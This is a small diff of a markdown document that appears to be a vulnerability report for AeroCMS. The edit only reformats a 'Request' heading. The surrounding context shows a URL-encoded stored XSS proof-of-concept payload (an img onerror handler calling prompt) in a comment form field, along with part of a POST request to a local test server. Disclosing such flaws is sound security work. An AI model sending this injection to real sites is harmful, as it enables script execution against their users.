@@ -16,7 +16,7 @@
 ```c
 comment_author=%3Cimg%2Fsrc%2Fonerror%3Dprompt%2810%29%3E&comment_email=bin%40gmail.com&comment_content=hacked&create_comment=
 ```
-* Request
+* `Request`
 ```c
 POST /AeroCMS/post.php?p_id=36 HTTP/1.1
 Host: localhost:8080
